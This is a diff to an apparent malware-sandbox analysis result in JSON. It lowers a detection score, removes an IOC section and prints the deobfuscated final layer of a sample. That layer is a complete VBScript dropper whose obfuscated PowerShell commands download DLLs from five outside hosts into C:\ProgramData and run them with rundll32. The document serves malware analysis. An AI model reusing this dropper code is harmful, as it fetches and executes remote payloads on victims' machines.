@@ -1,7 +1,7 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 100,
+    "score": 50,
     "sections": [
       {
         "auto_collapse": false,
@@ -30,7 +30,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "\\x00\\x02\\x8c\\x08(\\x00\\x00\\x00|\\x08\\x00\\x80Dim WAITPLZ, WS\nWAITPLZ = DateAdd(\"s\", 4, Now())\nDo Until (Now() > WAITPLZ)\nLoop\n\nLL1 = \"$Nano=\"IEX\";sal OY $Nano;$aa='(New-Ob'; $qq='ject Ne'; $ww='t.WebCli'; $ee='ent).Downl'; $rr='oadFile'; $bb='(''https://priyacareers.com/u9hDQN9Yy7g/pt.html'',''C:\\ProgramData\\www1.dll'')';$FOOX =($aa,$qq,$ww,$ee,$rr,$bb,$cc -Join ''); OY $FOOX|OY;\"\n\nLL2 = \"$Nanoz=\"IEX\";sal OY $Nanoz;$aa='(New-Ob'; $qq='ject Ne'; $ww='t.WebCli'; $ee='ent).Downl'; $rr='oadFile'; $bb='(''https://perfectdemos.com/Gv",
+        "body": "\\x00\\x02\\x8c\\x08(\\x00\\x00\\x00|\\x08\\x00\\x80Dim WAITPLZ, WS\nWAITPLZ = DateAdd(\"s\", 4, Now())\nDo Until (Now() > WAITPLZ)\nLoop\n\nLL1 = \"$Nano=\"IEX\";sal OY $Nano;$aa='(New-Ob'; $qq='ject Ne'; $ww='t.WebCli'; $ee='ent).Downl'; $rr='oadFile'; $bb='(''https://priyacareers.com/u9hDQN9Yy7g/pt.html'',''C:\\ProgramData\\www1.dll'')';$FOOX =($aa,$qq,$ww,$ee,$rr,$bb,$cc -Join ''); OY $FOOX|OY;\"\n\nLL2 = \"$Nanoz=\"IEX\";sal OY $Nanoz;$aa='(New-Ob'; $qq='ject Ne'; $ww='t.WebCli'; $ee='ent).Downl'; $rr='oadFile'; $bb='(''https://perfectdemos.com/Gv1iNAuMKZ/pt.html'',''C:\\ProgramData\\www2.dll'')';$FOOX =($aa,$qq,$ww,$ee,$rr,$bb,$cc -Join ''); OY $FOOX|OY;\"\n\nLL3 = \"$Nanox=\"IEX\";sal OY $Nanox;$aa='(New-Ob'; $qq='ject Ne'; $ww='t.WebCli'; $ee='ent).Downl'; $rr='oadFile'; $bb='(''https://bussiness-z.ml/ze8pCNTIkrIS/pt.html'',''C:\\ProgramData\\www3.dll'')';$FOOX =($aa,$qq,$ww,$ee,$rr,$bb,$cc -Join ''); OY $FOOX|OY;\"\n\nLL4 = \"$Nanoc=\"IEX\";sal OY $Nanoc;$aa='(New-Ob'; $qq='ject Ne'; $ww='t.WebCli'; $ee='ent).Downl'; $rr='oadFile'; $bb='(''https://cablingpoint.com/ByH5NDoE3kQA/pt.html'',''C:\\ProgramData\\www4.dll'')';$FOOX =($aa,$qq,$ww,$ee,$rr,$bb,$cc -Join ''); OY $FOOX|OY;\"\n\nLL5 = \"$Nanoc=\"IEX\";sal OY $Nanoc;$aa='(New-Ob'; $qq='ject Ne'; $ww='t.WebCli'; $ee='ent).Downl'; $rr='oadFile'; $bb='(''https://bonus.corporatebusinessmachines.co.in/1Y0qVNce/pt.html'',''C:\\ProgramData\\www5.dll'')';$FOOX =($aa,$qq,$ww,$ee,$rr,$bb,$cc -Join ''); OY $FOOX|OY;\"\n\n\nSet Ran = CreateObject(\"wscript.shell\")\nRan.Run \"powershell \"+LL1,\"0\"\nRan.Run \"powershell \"+LL2,\"0\"\nRan.Run \"powershell \"+LL3,\"0\"\nRan.Run \"powershell \"+LL4,\"0\"\nRan.Run \"powershell \"+LL5,\"0\"\nWScript.Sleep(15000)\nRan.Run \"cmd /c rundll32.exe C:\\ProgramData\\www1.dll,ldr\", \"0\"\nRan.Run \"cmd /c rundll32.exe C:\\ProgramData\\www2.dll,ldr\", \"0\"\nRan.Run \"cmd /c rundll32.exe C:\\ProgramData\\www3.dll,ldr\", \"0\"\nRan.Run \"cmd /c rundll32.exe C:\\ProgramData\\www4.dll,ldr\", \"0\"\nRan.Run \"cmd /c rundll32.exe C:\\ProgramData\\www5.dll,ldr\", \"0\"\nW)\\x00\\x00\\<\\x00\\x00\\x00\\x02\\x18\\x005\\x00\\x00\\x00\\x06\\x00\\x00\\x80\\xa5\\x00\\x00\\x00\\xcc\\x02\\x00\\x00Tahoma\\x00\\x00",
         "body_config": {},
         "body_format": "MEMORY_DUMP",
         "classification": "TLP:C",
@@ -38,47 +38,14 @@
         "heuristic": null,
         "promote_to": null,
         "tags": {},
-        "title_text": "First 500 bytes of the final layer:",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": "New IOCs found in pass 0:\nFound FILE STRING BLACKLISTED: WScript.Shell",
-        "body_config": {},
-        "body_format": "MEMORY_DUMP",
-        "classification": "TLP:C",
-        "depth": 0,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 5,
-          "score": 50,
-          "score_map": {},
-          "signatures": {}
-        },
-        "promote_to": null,
-        "tags": {
-          "file": {
-            "string": {
-              "blacklisted": [
-                "WScript.Shell"
-              ]
-            }
-          }
-        },
-        "title_text": "New IOCs found after de-obfustcation",
+        "title_text": "First 5000 bytes of the final layer:",
         "zeroize_on_tag_safe": false
       }
     ]
   },
   "files": {
     "extracted": [],
-    "supplementary": [
-      {
-        "name": "1b400b38af1288167d9818c394dd3231606264a837e12cd2632c70d829b01846_decoded_final",
-        "sha256": "644415a710a72de822828cea25db509bf6e822ef469a73e4987bd0999651e855"
-      }
-    ]
+    "supplementary": []
   },
   "results": {
     "heuristics": [
@@ -91,22 +58,9 @@
           "function.chr",
           "replace"
         ]
-      },
-      {
-        "attack_ids": [],
-        "heur_id": 5,
-        "signatures": []
       }
     ],
-    "tags": {
-      "file.string.blacklisted": [
-        {
-          "heur_id": 5,
-          "signatures": [],
-          "value": "WScript.Shell"
-        }
-      ]
-    },
+    "tags": {},
     "temp_submission_data": {}
   }
 }
